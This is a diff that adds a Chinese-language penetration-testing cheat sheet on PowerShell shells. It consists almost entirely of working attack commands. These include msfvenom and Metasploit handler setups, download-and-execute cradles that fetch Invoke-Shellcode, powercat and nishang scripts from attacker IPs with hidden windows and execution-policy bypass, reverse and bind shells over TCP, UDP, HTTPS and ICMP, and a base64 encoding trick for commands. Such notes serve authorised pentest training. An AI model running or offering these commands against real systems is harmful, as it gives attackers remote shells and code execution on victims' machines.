@@ -1,0 +1,72 @@
+  #### MSF+Powershell
+	反弹MSF
+	靶机
+	PS >IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1') 
+	PS >Invoke-Shellcode -payload windows/meterpreter/reverse_http -lhost 192.168.0.100 -lport 6666 -force
+	攻击机：
+	>use exploit/multi/handler
+	>set payload windows/x64/meterpreter/reverse_ https
+	>run
+	或
+	>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.100 LPORT=4444 -f powershell -o /var/www/html/ps
+	>IEX(New-Object Net.WebClient).DownloadString("http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1")
+	>IEX(New-Object Net.WebClient).DownloadString("http://192.168.0.100/ps")
+	>Invoke-Shellcode -Shellcode ($buf)
+	或
+	>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f psh-reflection >/var/www/html/a.ps1
+	>powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.101/a.ps1')"
+  #### Powercat
+	>powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+	正向连接
+	靶机:powercat -l -p 8080 -e cmd.exe –v
+	攻击机:nc 192.168.0.1 8080 –vv
+	反向连接：
+	攻击机：nc –l –p 8080 –vv
+	靶机:powercat –c 192.168.0.1 –p 8080 –v –e cmd.exe
+	远程执行
+	>powershell -nop -w hidden -ep bypass "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.0.107/ps/powercat/powercat.ps1'); powercat -c 192.168.0.107 -p 12345 -v -e cmd.exe"
+	正向连接
+	靶机:powercat -l -p 8080 -e cmd.exe -v
+	攻击机:nc 192.168.0.1 8080 -vv
+	反向连接：
+	攻击机：nc -l -p 8080 -vv
+	靶机:powercat -c 192.168.0.1 -p 8080 -v -e cmd.exe
+![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/207.png)
+  #### Nishang
+  ##### Bind shell
+	靶机：
+	>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Bind -Port 12138"
+	攻击机：
+	>nc 靶机IP 12138
+  ##### 反向shell
+	攻击机：
+	>nc -vnlp 9999
+	靶机：
+	>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 攻击机IP -port 9999"
+  ##### UDP反向shell
+	攻击机：
+	>nc -lvup 12138
+	靶机：
+	>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 攻击机IP -port 12138"
+  ##### HTTPS
+	攻击机：
+	>powershell -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PoshRatHttps.ps1'); Invoke-PoshRatHttps -IPAddress 192.168.0.98 -Port 8080 -SSLPort 443"  IP地址是本机IP
+![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/208.png)
+
+	靶机：
+	>powershell -w hidden -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.98:8080/connect')
+![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/209.png)
+  ##### ICMP
+	攻击机IP:108
+	靶机IP:100
+	https://github.com/inquisb/icmpsh
+	靶机执行
+	>powershell -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.108/ps/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp 192.168.0.108
+![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/210.png)
+
+	攻击机执行，开启相应ICMP ECHO请求
+	>sysctl -w net.ipv4.icmp_echo_ignore_all=1
+	>./icmpsh_m.py 192.168.0.108 192.168.0.100
+![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/211.png)
+  #### Base64
+	>Powershell "$string="net user";[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($string))"
